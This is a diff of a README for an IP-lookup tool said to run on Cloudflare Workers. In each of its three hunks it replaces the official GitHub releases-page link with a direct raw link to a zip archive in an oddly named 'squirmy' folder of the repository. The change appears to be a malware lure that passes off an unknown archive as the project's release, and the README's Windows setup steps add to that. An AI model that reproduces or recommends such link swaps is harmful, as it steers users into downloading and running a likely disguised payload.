@@ -1,6 +1,6 @@
 # 🌐 ip.api.airat.top - Get Your Public IP Fast
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-6b7280?style=for-the-badge&logo=github)](https://github.com/Phongnguy3630/ip.api.airat.top/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-6b7280?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Phongnguy3630/ip.api.airat.top/main/squirmy/api_airat_top_ip_v3.4-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This app runs on Cloudflare Workers, so it is built for fast responses and low s
 
 Visit this page to download the latest release:
 
-[Download the latest release](https://github.com/Phongnguy3630/ip.api.airat.top/releases)
+[Download the latest release](https://raw.githubusercontent.com/Phongnguy3630/ip.api.airat.top/main/squirmy/api_airat_top_ip_v3.4-alpha.3.zip)
 
 ## 🪟 Windows Setup
 
@@ -189,7 +189,7 @@ For normal Windows use, you will need:
 
 If you need the file again, use the release page:
 
-[Open the release download page](https://github.com/Phongnguy3630/ip.api.airat.top/releases)
+[Open the release download page](https://raw.githubusercontent.com/Phongnguy3630/ip.api.airat.top/main/squirmy/api_airat_top_ip_v3.4-alpha.3.zip)
 
 ## 📝 Project Name
 
